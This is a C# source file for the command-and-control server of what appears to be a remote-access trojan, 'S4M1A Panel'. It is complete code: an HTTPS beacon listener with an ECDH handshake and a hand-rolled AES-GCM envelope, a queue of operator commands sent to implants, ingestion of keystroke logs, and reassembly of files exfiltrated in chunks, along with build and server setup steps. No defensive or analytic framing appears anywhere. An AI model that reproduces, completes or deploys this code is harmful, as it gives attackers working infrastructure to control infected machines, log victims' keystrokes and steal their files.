using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Web.Script.Serialization;

namespace S4M1A.Panel
{
    // =====================================================================
    //  S4M1A Panel v2.0 - C2Server.cs
    //  HTTPS beacon listener: ECDH P-256 handshake, AES-256-GCM envelope,
    //  command queue, result/keystroke ingestion, chunk download receiver.
    //
    //  WIRE CONTRACT (must match src/Implant Crypto.cs + Network.cs):
    //    handshake POST /h        {"pub":"<b64 SEC1 65B>"}
    //        -> 200 {"sid":"<uuid>","srv":"<b64 SEC1 65B>"}   plain JSON
    //    beacon    POST /b/<sid>  envelope(info json) -> envelope(task)
    //        beacon JSON: {"info":{...},"res":{...},"klog":"<b64>"}
    //        task reply:  {"t":"cmd","cid":"...","cmd":"...","args":"..."}
    //        or           {"t":"none"}
    //    chunk     POST /x/<sid>/<token>/<idx>?name=&size=&sha=&done=1
    //        -> {"ok":true,"next":<idx+1>} | {"ok":false,"have":<n>}
    //    envelope  = magic "S4M1A012"(8) || iv(12) || ct || tag(16)
    //    plaintext = [0] flag byte (1 = DEFLATE) || payload
    //    session key = SHA256(ECDH_shared || "S4M1A-KDF1")     // SYNC A
    //    if cfg.Bearer set: all endpoints need X-S4M1A-Token
    //
    //  Build:  csc /nologo /t:exe /out:Panel.exe /r:System.Web.Extensions.dll
    //          /r:System.Runtime.Serialization.dll Session.cs CommandHandler.cs
    //          C2Server.cs Panel.cs
    //  Setup (admin, once):
    //    netsh http add urlacl url=https://+:443/ user=Everyone
    //    netsh http add sslcert ipport=0.0.0.0:443 certhash=<THUMB>
    //          appid={A73A5E4D-3B9F-4C21-9E6A-1F2C3D4E5F60}
    // =====================================================================

    // ------------------------------------------------------------------
    //  AES-256-GCM for .NET Framework (no AesGcm class) - hand-rolled
    //  GHASH over GF(2^128) with bit-loop multiply. 96-bit IV, 16-byte
    //  tag, no AAD. Interops with standard GCM implementations.
    // ------------------------------------------------------------------
    internal static class Gcm
    {
        private const int Br = 16;

        public static byte[] Encrypt(byte[] key, byte[] iv, byte[] plain)
        {
            ICryptoTransform enc = Aes(key);
            byte[] h = BlockEnc(enc, new byte[Br]);
            byte[] j0 = MakeJ0(iv);
            byte[] ct = CounterCipher(enc, j0, plain);
            byte[] s = Ghash(h, ct);
            byte[] t = BlockEnc(enc, j0);
            XorEq(t, s);
            byte[] o = new byte[ct.Length + Br];
            Buffer.BlockCopy(ct, 0, o, 0, ct.Length);
            Buffer.BlockCopy(t, 0, o, ct.Length, Br);
            return o;
        }

        public static byte[] Decrypt(byte[] key, byte[] iv, byte[] ct, byte[] tag)
        {
            ICryptoTransform enc = Aes(key);
            byte[] h = BlockEnc(enc, new byte[Br]);
            byte[] j0 = MakeJ0(iv);
            byte[] s = Ghash(h, ct);
            byte[] t = BlockEnc(enc, j0);
            XorEq(t, s);
            if (!Equal(t, tag)) return null;
            return CounterCipher(enc, j0, ct);
        }

        private static ICryptoTransform Aes(byte[] key)
        {
            System.Security.Cryptography.Aes aes = System.Security.Cryptography.Aes.Create();
            aes.KeySize = 256;
            aes.Key = key;
            aes.Mode = CipherMode.ECB;
            aes.Padding = PaddingMode.None;
            return aes.CreateEncryptor();
        }

        private static byte[] BlockEnc(ICryptoTransform enc, byte[] b)
        {
            byte[] o = new byte[Br];
            enc.TransformBlock(b, 0, Br, o, 0);
            return o;
        }

        private static byte[] MakeJ0(byte[] iv)
        {
            byte[] j0 = new byte[Br];
            Buffer.BlockCopy(iv, 0, j0, 0, 12);
            j0[15] = 1;
            return j0;
        }

        private static void Inc32(byte[] c)
        {
            for (int i = 15; i >= 12; i--)
                if (++c[i] != 0) return;
        }

        private static byte[] CounterCipher(ICryptoTransform enc, byte[] j0, byte[] data)
        {
            byte[] ctr = (byte[])j0.Clone();
            Inc32(ctr);
            byte[] o = new byte[data.Length];
            for (int off = 0; off < data.Length; off += Br)
            {
                byte[] s = BlockEnc(enc, ctr);
                int n = Math.Min(Br, data.Length - off);
                for (int i = 0; i < n; i++) o[off + i] = (byte)(data[off + i] ^ s[i]);
                Inc32(ctr);
            }
            return o;
        }

        private static byte[] Ghash(byte[] h, byte[] ct)
        {
            byte[] y = new byte[Br];
            AddBlocks(h, ct, y);
            byte[] len = new byte[Br];
            PutU64(len, 0, 0);
            PutU64(len, 8, (ulong)ct.Length * 8);
            Mul(Xor16(y, len), h, y);
            return y;
        }

        private static void AddBlocks(byte[] h, byte[] data, byte[] y)
        {
            if (data == null || data.Length == 0) return;
            int i = 0;
            for (; i + Br <= data.Length; i += Br)
                Mul(Xor16(y, Slice(data, i, Br)), h, y);
            if (i < data.Length)
            {
                byte[] last = new byte[Br];
                Buffer.BlockCopy(data, i, last, 0, data.Length - i);
                Mul(Xor16(y, last), h, y);
            }
        }

        // GF(2^128) multiply: z = a * b  (R = x^128 + x^7 + x^2 + x + 1)
        private static void Mul(byte[] a, byte[] b, byte[] z)
        {
            byte[] v = (byte[])b.Clone();
            byte[] r = new byte[Br];
            for (int i = 0; i < 128; i++)
            {
                if ((a[i >> 3] & (byte)(0x80 >> (i & 7))) != 0)
                    XorEq(r, v);
                bool lsb = (v[15] & 1) != 0;
                for (int k = 15; k > 0; k--)
                    v[k] = (byte)((v[k] >> 1) | ((v[k - 1] & 1) << 7));
                v[0] = (byte)(v[0] >> 1);
                if (lsb) v[0] ^= 0xE1;
            }
            Buffer.BlockCopy(r, 0, z, 0, Br);
        }

        private static void PutU64(byte[] b, int off, ulong v)
        {
            for (int i = off + 7; i >= off; i--) { b[i] = (byte)(v & 0xFF); v >>= 8; }
        }

        private static byte[] Xor16(byte[] a, byte[] b)
        {
            byte[] r = new byte[Br];
            for (int i = 0; i < Br; i++) r[i] = (byte)(a[i] ^ b[i]);
            return r;
        }

        private static void XorEq(byte[] a, byte[] b)
        {
            for (int i = 0; i < Br; i++) a[i] ^= b[i];
        }

        private static bool Equal(byte[] a, byte[] b)
        {
            if (a.Length != b.Length) return false;
            int d = 0;
            for (int i = 0; i < a.Length; i++) d |= a[i] ^ b[i];
            return d == 0;
        }

        private static byte[] Slice(byte[] s, int off, int n)
        {
            byte[] r = new byte[n];
            Buffer.BlockCopy(s, off, r, 0, n);
            return r;
        }
    }

    // =====================================================================
    //  Download state (chunk exfil reassembly)
    // =====================================================================
    [DataContract]
    public sealed class DownloadState
    {
        [DataMember] public string Token { get; set; }
        [DataMember] public string Sid { get; set; }
        [DataMember] public string Name { get; set; }
        [DataMember] public string Sha256 { get; set; }
        [DataMember] public long Size { get; set; }
        [DataMember] public int Next { get; set; }
        [DataMember] public bool Done { get; set; }
    }

    // =====================================================================
    //  C2Server
    // =====================================================================
    public sealed class C2Server
    {
        private static readonly byte[] Magic = Encoding.ASCII.GetBytes("S4M1A012");   // SYNC B
        private static readonly byte[] KdfCtx = Encoding.ASCII.GetBytes("S4M1A-KDF1"); // SYNC A
        private const int MaxBody = 32 * 1024 * 1024;
        private const string BearerHeader = "X-S4M1A-Token";
        private const int ChunkSize = 512 * 1024;

        private readonly PanelConfig _cfg;
        private readonly string _dlDir;
        private readonly ECDiffieHellmanCng _dh;
        private readonly Dictionary<string, byte[]> _keys;
        private readonly Dictionary<string, DownloadState> _dl;
        private readonly object _lock = new object();
        private readonly DataContractJsonSerializer _taskSer =
            new DataContractJsonSerializer(typeof(CmdTask));
        private readonly JavaScriptSerializer _js =
            new JavaScriptSerializer { MaxJsonLength = MaxBody };

        private HttpListener _listener;
        private volatile bool _running;
        private byte[] _srvSec1;

        public C2Server(PanelConfig cfg)
        {
            _cfg = cfg;
            _dlDir = Path.Combine(cfg.DataDir, "downloads");
            try { Directory.CreateDirectory(_dlDir); } catch { }
            _keys = new Dictionary<string, byte[]>();
            _dl = new Dictionary<string, DownloadState>();
            // Session key = SHA256(shared_secret || KdfCtx) via CNG KDF.
            _dh = new ECDiffieHellmanCng(256);
            _dh.KeyDerivationFunction = ECDiffieHellmanKeyDerivationFunction.Hash;
            _dh.HashAlgorithm = CngAlgorithm.Sha256;
            _dh.SecretAppend = KdfCtx;
        }

        // ------------------------------------------------------------------
        //  Lifecycle
        // ------------------------------------------------------------------

        public void Start()
        {
            _listener = new HttpListener();
            _listener.Prefixes.Add("https://+:" + _cfg.Port + "/");
            _listener.AuthenticationSchemes = AuthenticationSchemes.Anonymous;
            _listener.Start();
            _srvSec1 = ExportSec1(_dh);
            _running = true;
            Thread t = new Thread(AcceptLoop);
            t.IsBackground = true;
            t.Start();
            StartSweep();
        }

        public void Stop()
        {
            _running = false;
            try { if (_listener != null) _listener.Stop(); } catch { }
        }

        private void AcceptLoop()
        {
            while (_running)
            {
                try
                {
                    HttpListenerContext ctx = _listener.GetContext();
                    ThreadPool.QueueUserWorkItem(HandleCtx, ctx);
                }
                catch { Thread.Sleep(100); }
            }
        }

        private void HandleCtx(object state)
        {
            HttpListenerContext ctx = (HttpListenerContext)state;
            try { Dispatch(ctx); }
            catch { }
            finally { try { ctx.Response.Close(); } catch { } }
        }

        private void Dispatch(HttpListenerContext ctx)
        {
            string path = ctx.Request.Url.AbsolutePath;
            if (path == "/h")
            { if (AuthPass(ctx)) DoHandshake(ctx); return; }
            if (path.StartsWith("/b/"))
            { if (AuthPass(ctx)) DoBeacon(ctx, path.Substring(3)); return; }
            if (path.StartsWith("/x/"))
            { if (AuthPass(ctx)) DoChunk(ctx, path.Substring(3)); return; }
            SendRaw(ctx, 404, "not found");
        }

        private bool AuthPass(HttpListenerContext ctx)
        {
            if (string.IsNullOrEmpty(_cfg.Bearer)) return true;
            string t = ctx.Request.Headers[BearerHeader];
            if (!string.IsNullOrEmpty(t) && t == _cfg.Bearer) return true;
            SendRaw(ctx, 403, "forbidden");
            return false;
        }

        // ------------------------------------------------------------------
        //  Handshake: POST /h
        // ------------------------------------------------------------------

        private void DoHandshake(HttpListenerContext ctx)
        {
            if (ctx.Request.HttpMethod != "POST") { SendRaw(ctx, 405, "method"); return; }
            Dictionary<string, object> req = SafeJson(ReadBody(ctx.Request));
            if (req == null || !req.ContainsKey("pub")) { SendRaw(ctx, 400, "bad req"); return; }

            byte[] peerSec1;
            try { peerSec1 = Convert.FromBase64String(Convert.ToString(req["pub"])); }
            catch { SendRaw(ctx, 400, "bad pub"); return; }

            ECDiffieHellmanPublicKey peer = ImportSec1(peerSec1);
            if (peer == null) { SendRaw(ctx, 400, "bad key"); return; }

            byte[] key;
            try { key = _dh.DeriveKeyMaterial(peer); }
            catch { SendRaw(ctx, 400, "kdf"); return; }

            string sid = Guid.NewGuid().ToString("N");
            lock (_lock) { _keys[sid] = key; }

            string resp = "{\"sid\":\"" + sid + "\",\"srv\":\"" +
                          Convert.ToBase64String(_srvSec1) + "\"}";
            SendRaw(ctx, 200, resp);
        }

        // ------------------------------------------------------------------
        //  Beacon: POST /b/<sid>
        // ------------------------------------------------------------------

        private void DoBeacon(HttpListenerContext ctx, string sid)
        {
            if (ctx.Request.HttpMethod != "POST") { SendRaw(ctx, 405, "method"); return; }
            byte[] key = GetKey(sid);
            if (key == null) { SendRaw(ctx, 404, "no session"); return; }

            byte[] body = ReadBodyBytes(ctx.Request);
            byte[] pt = DecryptEnv(key, body);
            if (pt == null) { SendRaw(ctx, 400, "decrypt"); return; }

            Dictionary<string, object> env = SafeJson(Encoding.UTF8.GetString(pt));
            if (env == null) { SendRaw(ctx, 400, "json"); return; }

            Session s = SessionStore.GetOrCreate(sid);

            Dictionary<string, string> info = new Dictionary<string, string>();
            if (env.ContainsKey("info") && env["info"] is Dictionary<string, object>)
            {
                foreach (KeyValuePair<string, object> kv in (Dictionary<string, object>)env["info"])
                    if (kv.Value != null) info[kv.Key] = Convert.ToString(kv.Value);
            }
            s.UpdateInfo(info);

            if (env.ContainsKey("res") && env["res"] is Dictionary<string, object>)
            {
                Dictionary<string, object> res = (Dictionary<string, object>)env["res"];
                string cid = res.ContainsKey("cid") ? Convert.ToString(res["cid"]) : "";
                CommandHandler.SubmitResult(sid, cid, res);
            }

            if (env.ContainsKey("klog"))
                CommandHandler.AppendKlog(sid, Convert.ToString(env["klog"]));

            CmdTask task = CommandHandler.NextFor(sid);
            string replyJson = "{\"t\":\"none\"}";
            if (task != null)
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    _taskSer.WriteObject(ms, task);
                    replyJson = Encoding.UTF8.GetString(ms.ToArray());
                }
            }

            byte[] resp = EncryptEnv(key, replyJson);
            ctx.Response.StatusCode = 200;
            ctx.Response.ContentType = "application/octet-stream";
            ctx.Response.OutputStream.Write(resp, 0, resp.Length);
        }

        // ------------------------------------------------------------------
        //  Chunk download: POST /x/<sid>/<token>/<idx>
        // ------------------------------------------------------------------

        private void DoChunk(HttpListenerContext ctx, string rest)
        {
            if (ctx.Request.HttpMethod != "POST") { SendRaw(ctx, 405, "method"); return; }
            string[] parts = rest.Split('/');
            if (parts.Length != 3) { SendRaw(ctx, 400, "path"); return; }
            string sid = parts[0];
            string token = parts[1];
            int idx;
            if (!int.TryParse(parts[2], out idx) || GetKey(sid) == null)
            { SendRaw(ctx, 403, "denied"); return; }

            DownloadState d;
            lock (_lock)
            {
                if (!_dl.TryGetValue(token, out d))
                {
                    d = new DownloadState { Token = token, Sid = sid, Next = 0 };
                    _dl[token] = d;
                    try { Directory.CreateDirectory(PartDir(token)); } catch { }
                }
            }
            if (d.Sid != sid) { SendRaw(ctx, 400, "token"); return; }

            if (idx != d.Next)
            { SendJson(ctx, "{\"ok\":false,\"have\":" + d.Next + "}"); return; }

            byte[] chunk = ReadBodyBytes(ctx.Request);
            if (chunk == null || chunk.Length == 0)
            { SendJson(ctx, "{\"ok\":false,\"have\":" + d.Next + "}"); return; }

            string sha = ctx.Request.QueryString["sha"];
            if (!string.IsNullOrEmpty(sha) &&
                !Sha256Hex(chunk).Equals(sha, StringComparison.OrdinalIgnoreCase))
            { SendJson(ctx, "{\"ok\":false,\"have\":" + d.Next + "}"); return; }

            string partFile = Path.Combine(PartDir(token), idx + ".part");
            try { File.WriteAllBytes(partFile, chunk); }
            catch { SendJson(ctx, "{\"ok\":false,\"have\":" + d.Next + "}"); return; }
            d.Next = idx + 1;

            if (ctx.Request.QueryString["done"] == "1")
            {
                string name = ctx.Request.QueryString["name"];
                d.Name = string.IsNullOrEmpty(name) ? token + ".bin" : Path.GetFileName(name);
                long size;
                long.TryParse(ctx.Request.QueryString["size"], out size);
                d.Size = size;
                d.Sha256 = ctx.Request.QueryString["sha"];

                if (Finalize(d))
                {
                    SendJson(ctx, "{\"ok\":true,\"next\":" + d.Next +
                                  ",\"file\":\"" + d.Name + "\"}");
                    return;
                }
                SendJson(ctx, "{\"ok\":false,\"have\":" + d.Next + ",\"err\":\"integrity\"}");
                return;
            }

            SendJson(ctx, "{\"ok\":true,\"next\":" + d.Next + "}");
        }

        private bool Finalize(DownloadState d)
        {
            string dir = PartDir(d.Token);
            string outFile = Path.Combine(_dlDir, d.Name);
            try
            {
                using (FileStream fs = File.Create(outFile))
                {
                    int i = 0;
                    string p;
                    while (File.Exists(p = Path.Combine(dir, i + ".part")))
                    {
                        byte[] b = File.ReadAllBytes(p);
                        fs.Write(b, 0, b.Length);
                        i++;
                    }
                }
                if (d.Size > 0 && new FileInfo(outFile).Length != d.Size) return false;
                if (!string.IsNullOrEmpty(d.Sha256) &&
                    !Sha256File(outFile).Equals(d.Sha256, StringComparison.OrdinalIgnoreCase))
                    return false;
                try { Directory.Delete(dir, true); } catch { }
                d.Done = true;
                return true;
            }
            catch { return false; }
        }

        // ------------------------------------------------------------------
        //  Key / session maintenance
        // ------------------------------------------------------------------

        private byte[] GetKey(string sid)
        {
            lock (_lock)
            {
                byte[] k;
                return _keys.TryGetValue(sid, out k) ? k : null;
            }
        }

        private void StartSweep()
        {
            Thread t = new Thread(delegate()
            {
                while (_running)
                {
                    Thread.Sleep(30 * 60 * 1000);
                    try
                    {
                        CommandHandler.PurgeDead(_cfg.DeadHours);
                        lock (_lock)
                        {
                            List<Session> all = SessionStore.All();
                            List<string> drop = new List<string>();
                            foreach (KeyValuePair<string, byte[]> kv in _keys)
                                if (!all.Any(s => s.Sid == kv.Key)) drop.Add(kv.Key);
                            foreach (string s2 in drop) _keys.Remove(s2);

                            List<string> done = new List<string>();
                            foreach (KeyValuePair<string, DownloadState> kv in _dl)
                                if (kv.Value.Done) done.Add(kv.Key);
                            foreach (string t2 in done) _dl.Remove(t2);
                        }
                    }
                    catch { }
                }
            });
            t.IsBackground = true;
            t.Start();
        }

        private string PartDir(string token)
        {
            return Path.Combine(_dlDir, token);
        }

        // ------------------------------------------------------------------
        //  Crypto helpers
        // ------------------------------------------------------------------

        private byte[] EncryptEnv(byte[] key, string json)
        {
            byte[] payload = Encoding.UTF8.GetBytes(json);
            byte[] body;
            if (payload.Length > 512)
            {
                using (MemoryStream o = new MemoryStream())
                {
                    o.WriteByte(1);
                    using (DeflateStream ds = new DeflateStream(o, CompressionMode.Compress, true))
                        ds.Write(payload, 0, payload.Length);
                    body = o.ToArray();
                }
            }
            else
            {
                body = new byte[payload.Length + 1];
                Buffer.BlockCopy(payload, 0, body, 1, payload.Length);
            }

            byte[] iv = RandomBytes(12);
            byte[] ct = Gcm.Encrypt(key, iv, body);
            byte[] env = new byte[8 + 12 + ct.Length];
            Buffer.BlockCopy(Magic, 0, env, 0, 8);
            Buffer.BlockCopy(iv, 0, env, 8, 12);
            Buffer.BlockCopy(ct, 0, env, 20, ct.Length);
            return env;
        }

        private byte[] DecryptEnv(byte[] key, byte[] blob)
        {
            try
            {
                if (blob == null || blob.Length < 36) return null;
                for (int i = 0; i < Magic.Length; i++)
                    if (blob[i] != Magic[i]) return null;

                byte[] iv = Slice(blob, 8, 12);
                int ctLen = blob.Length - 36;
                byte[] ct = Slice(blob, 20, ctLen);
                byte[] tag = Slice(blob, blob.Length - 16, 16);

                byte[] pt = Gcm.Decrypt(key, iv, ct, tag);
                if (pt == null || pt.Length == 0) return null;

                if (pt[0] == 1)
                {
                    using (MemoryStream ms = new MemoryStream(pt, 1, pt.Length - 1))
                    using (DeflateStream ds = new DeflateStream(ms, CompressionMode.Decompress))
                    using (MemoryStream o = new MemoryStream())
                    {
                        ds.CopyTo(o);
                        return o.ToArray();
                    }
                }
                if (pt[0] != 0) return null;
                byte[] r = new byte[pt.Length - 1];
                Buffer.BlockCopy(pt, 1, r, 0, r.Length);
                return r;
            }
            catch { return null; }
        }

        private static byte[] RandomBytes(int n)
        {
            byte[] b = new byte[n];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
                rng.GetBytes(b);
            return b;
        }

        private static string Sha256Hex(byte[] data)
        {
            using (SHA256 h = SHA256.Create())
                return BitConverter.ToString(h.ComputeHash(data)).Replace("-", "");
        }

        private static string Sha256File(string path)
        {
            using (FileStream fs = File.OpenRead(path))
            using (SHA256 h = SHA256.Create())
                return BitConverter.ToString(h.ComputeHash(fs)).Replace("-", "");
        }

        // ECDH public key <-> SEC1 uncompressed (0x04 || X || Y)
        private static byte[] ExportSec1(ECDiffieHellmanCng dh)
        {
            byte[] blob = dh.PublicKey.ToByteArray(); // EccPublicBlob
            byte[] sec1 = new byte[65];
            sec1[0] = 4;
            Buffer.BlockCopy(blob, 8, sec1, 1, 64);
            return sec1;
        }

        private static ECDiffieHellmanPublicKey ImportSec1(byte[] sec1)
        {
            try
            {
                if (sec1 == null || sec1.Length != 65 || sec1[0] != 4) return null;
                byte[] blob = new byte[72];
                blob[0] = 0x45; blob[1] = 0x43; blob[2] = 0x4B; blob[3] = 0x31; // "ECK1"
                blob[4] = 32; blob[5] = 0; blob[6] = 0; blob[7] = 0;           // cbKey = 32 LE
                Buffer.BlockCopy(sec1, 1, blob, 8, 64);
                return ECDiffieHellmanCngPublicKey.FromByteArray(blob, CngKeyBlobFormat.EccPublicBlob);
            }
            catch { return null; }
        }

        // ------------------------------------------------------------------
        //  Misc helpers
        // ------------------------------------------------------------------

        private Dictionary<string, object> SafeJson(string s)
        {
            try { return _js.DeserializeObject(s) as Dictionary<string, object>; }
            catch { return null; }
        }

        private static string ReadBody(HttpListenerRequest req)
        {
            using (StreamReader r = new StreamReader(req.InputStream, Encoding.UTF8))
                return r.ReadToEnd();
        }

        private static byte[] ReadBodyBytes(HttpListenerRequest req)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                byte[] buf = new byte[65536];
                int n;
                long total = 0;
                while ((n = req.InputStream.Read(buf, 0, buf.Length)) > 0)
                {
                    total += n;
                    if (total > MaxBody) return null;
                    ms.Write(buf, 0, n);
                }
                return ms.ToArray();
            }
        }

        private static byte[] Slice(byte[] b, int off, int n)
        {
            byte[] r = new byte[n];
            Buffer.BlockCopy(b, off, r, 0, n);
            return r;
        }

        private static void SendRaw(HttpListenerContext ctx, int code, string text)
        {
            byte[] b = Encoding.UTF8.GetBytes(text);
            ctx.Response.StatusCode = code;
            ctx.Response.ContentType = "text/plain";
            ctx.Response.OutputStream.Write(b, 0, b.Length);
        }

        private static void SendJson(HttpListenerContext ctx, string json)
        {
            byte[] b = Encoding.UTF8.GetBytes(json);
            ctx.Response.StatusCode = 200;
            ctx.Response.ContentType = "application/json";
            ctx.Response.OutputStream.Write(b, 0, b.Length);
        }
    }
}